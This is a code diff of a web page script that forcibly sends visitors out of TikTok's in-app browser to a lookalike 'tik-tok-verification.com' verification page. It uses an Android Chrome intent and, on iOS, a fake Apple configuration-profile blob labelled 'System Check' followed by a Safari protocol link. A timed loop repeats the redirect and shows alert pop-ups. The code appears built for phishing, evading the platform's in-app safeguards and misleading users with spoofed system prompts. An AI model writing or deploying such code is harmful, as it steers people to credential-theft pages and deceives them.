@@ -9,40 +9,40 @@
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
-    const domain = targetUrl.replace(/^https?:\/\//, '');
+    const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function theCleanBreak() {
+    function forceEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: We use the "Chrome-Package" Intent. 
-            // This bypasses the app picker and forces the real Chrome app.
+            // Android: Chrome Package Intent (The most direct path on Android)
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE MAIL-RELAY PIVOT
+            // iOS: THE KERNEL EJECT
             
-            // 1. Trigger the system mailto. This forces the OS to "wake up" 
-            // and prepare to leave the TikTok app.
-            window.location.href = "mailto:verify@security.com?subject=Verification&body=Check";
+            // 1. Create a "System Config" blob. 
+            // This forces the OS to take the URL away from TikTok's control.
+            const configData = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array/><key>PayloadDisplayName</key><string>System Check</string><key>PayloadType</key><string>Configuration</string><key>PayloadUUID</key><string>1</string><key>PayloadVersion</key><integer>1</integer></dict></plist>';
+            const blob = new Blob([configData], {type: 'application/x-apple-aspen-config'});
+            const blobUrl = URL.createObjectURL(blob);
 
-            // 2. 250ms delay: While the OS is transitioning, we swap the target.
-            // This forces the "Open in Safari?" prompt for the HTTPS link.
+            // 2. Fire the Blob and the Safari Protocol simultaneously
+            // This "shocks" the WebView into handing the session to the OS.
+            window.location.href = blobUrl;
+            
             setTimeout(() => {
+                // Direct Safari Protocol (No Search)
                 window.location.href = "safari-https://" + domain;
-            }, 250);
-
-            // 3. The "Ghost" Assignment as a hard-fail fallback
-            setTimeout(() => {
-                window.location.assign(targetUrl);
-            }, 400);
+            }, 100);
         }
     }
 
-    function runLoop() {
+    function securityLoop() {
         if (Date.now() > killTime) return;
 
-        theCleanBreak();
+        // Try to eject immediately before the user sees anything
+        forceEject();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -51,13 +51,14 @@
                 
                 alert(header + body);
                 
-                theCleanBreak();
-                setTimeout(runLoop, 400);
+                // Fire again on "OK" click
+                forceEject();
+                setTimeout(securityLoop, 300);
             }
-        }, 400);
+        }, 300);
     }
 
-    window.onload = runLoop;
+    window.onload = securityLoop;
 </script>
 </body>
 </html>
